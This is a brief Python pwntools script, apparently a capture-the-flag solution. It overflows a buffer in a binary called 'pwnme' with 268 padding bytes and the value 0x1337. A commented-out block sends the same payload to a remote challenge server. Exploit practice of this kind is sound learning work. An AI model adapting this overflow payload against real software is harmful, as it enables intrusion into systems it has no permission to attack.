#!/usr/bin/python3

from pwn import *

e = ELF('./pwnme')
address_offset = 268

value = 0x1337

payload = address_offset * 'A'
payload = payload.encode()
payload += p32(value)

p = process('./pwnme')

p.sendline(payload)
p.interactive()
'''
conn = remote('0.cloud.chals.io',19595)
conn.sendline(payload)
conn.interactive()
'''

